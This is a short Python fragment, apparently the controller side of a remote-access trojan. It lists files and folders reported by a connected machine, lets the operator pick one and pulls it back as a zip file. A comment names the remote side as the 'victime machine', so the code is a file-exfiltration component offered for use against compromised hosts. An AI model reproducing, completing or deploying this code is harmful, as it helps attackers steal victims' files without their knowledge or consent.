import json
DELIMETER="<END_OF_RESULTS>"

def receive_file_folders(mysocket):
    full_list=b''
    while True:
        chunk=mysocket.client_conn.recv(4024)
        if chunk.endswith(DELIMETER.encode()):
            chunk=chunk[:-len(DELIMETER)]
            full_list+=chunk
            break
        full_list+=chunk
    files_dict=json.loads(full_list)
    for index in files_dict:
       print("\t"+index+"\t"+files_dict[index])
    file_index=input("[+] Select the file/folder")   
    file2download=files_dict[file_index]
    #send to victime machine which file do you want to download
    mysocket.sendData(file2download)
    #receive zip file ----
    zippedfile=mysocket.receiveData()
    print("[+] receive zip file name is "+ zippedfile)
    mysocket.receive_zip_file(zippedfile)




